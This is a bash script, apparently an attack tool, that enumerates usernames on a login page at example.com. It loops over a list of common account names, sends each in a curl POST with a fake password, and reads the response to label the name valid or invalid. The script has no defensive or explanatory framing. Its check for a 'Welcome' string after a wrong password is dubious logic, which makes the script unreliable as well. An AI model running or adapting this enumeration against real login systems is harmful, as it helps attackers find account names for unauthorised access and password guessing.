#!/bin/bash

# Target URL
URL="http://example.com/login"

# List of usernames to test
USERNAMES=("admin" "user" "guest" "root" "john")

# Loop through usernames and send POST requests
for username in "${USERNAMES[@]}"; do
    echo "Testing username: $username"
    
    # Send a POST request with the username and a fake password
    RESPONSE=$(curl -s -X POST -d "username=$username&password=wrongpass" $URL)

    # Check if the response contains a specific string for valid users
    if [[ $RESPONSE == *"Welcome"* ]]; then
        echo "Valid username found: $username"
    else
        echo "Invalid username: $username"
    fi
done
